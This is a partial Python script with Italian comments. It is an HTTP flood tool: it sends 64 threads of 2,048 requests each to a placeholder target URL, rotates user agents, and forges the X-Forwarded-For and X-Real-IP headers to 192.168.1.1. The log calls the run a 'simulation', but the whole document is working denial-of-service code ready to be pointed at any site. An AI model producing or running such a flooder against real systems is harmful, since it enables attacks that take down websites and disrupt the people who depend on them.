...
# Configurazioni
TARGET_URL = "https://?????.com"  # url (https/http)
THREAD_COUNT = 64  # Theard
REQUEST_COUNT = 2048  # Requests
USER_AGENTS = [
...
logging.basicConfig(
    ...
    handlers=[
        logging.FileHandler("http_flood.log", mode="w"),
...
def send_request(session):
    headers = {
        ...
        "X-Forwarded-For": "192.168.1.1",  # Use a valid proxy or IP address if needed
        "X-Frame-Options": "DENY",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Charset": "UTF-8,ISO-8859-1;q=0.7,*;q=0.7",  # Charset preferences
        ...
        "Accept-Ranges": "bytes",
        "Date": "Tue, 11 Dec 2024 12:00:00 GMT",  # Optional: provide server date
        "If-Modified-Since": "Wed, 02 Oct 2024 08:00:00 GMT",  # Optional: use conditional requests
        "If-None-Match": "W/\"abc123\"",  # Optional: for ETag-based validation
        "X-Powered-By": "PHP/7.4.3",  # Include for technology used (optional)
        "X-Real-IP": "192.168.1.1",  # If you want to specify real IP
        "X-Forwarded-Proto": "https",  # Protocol used by the request
    }
    ...
    try:
        ...
        if response.status_code == 200:
            ...
            logging.warning(f"Request failed: Status {response.status_code} - {response.text[:200]}")  # Limit the body output for logs
            return False
    except requests.exceptions.RequestException as e:
        # Log the specific error
        logging.error(f"Error during request: {e}")
        return False
# Funzione per eseguire richieste in thread
def worker(request_queue, success_count, failure_count):
    session = requests.Session()
    while not request_queue.empty():
        for _ in range(REQUEST_COUNT):
            success = send_request(session)
            if success:
                success_count.append(1)  # Aggiungi 1 al contatore di successo
            else:
                failure_count.append(1)  # Aggiungi 1 al contatore di fallimento
            time.sleep(random.uniform(0.5, 2))  # Ritardo casuale tra le richieste
        request_queue.task_done()

    threads = []
    for _ in range(THREAD_COUNT):
        thread = threading.Thread(target=worker, args=(request_queue, success_count, failure_count))
        thread.start()
...
if __name__ == "__main__":
    ...
    logging.info("[COMPLETATO] Simulazione di flood HTTP completata.")
    logging.info(f"Richieste riuscite: {len(success_count)}, Richieste fallite: {len(failure_count)}") 
